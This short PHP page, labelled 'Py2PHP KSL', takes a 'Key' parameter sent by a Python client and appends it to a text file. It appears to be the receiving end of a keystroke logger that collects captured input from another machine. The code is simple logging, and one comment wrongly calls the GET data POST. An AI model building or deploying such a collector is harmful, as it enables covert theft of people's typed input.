<!-- 
  _____     _   _                   
 |  _  |_ _| |_| |_ ___ ___ ___ ___ 
 |   __| | |  _|   | . | . | -_|   |
 |__|  |_  |_| |_|_|___|_  |___|_|_|
       |___|           |___|        
 Py2PHP KSL
 By Pythogen

-->

<html>
<head>
	<title>Py2PHP Log</title>
</head>
<body>

<?php
	// Variable contains data from Py client.
	$testDat = htmlspecialchars($_GET["Key"]);

	// Append POST data into file.
	echo file_put_contents('test.txt', $testDat, FILE_APPEND);
?>

</body>
</html>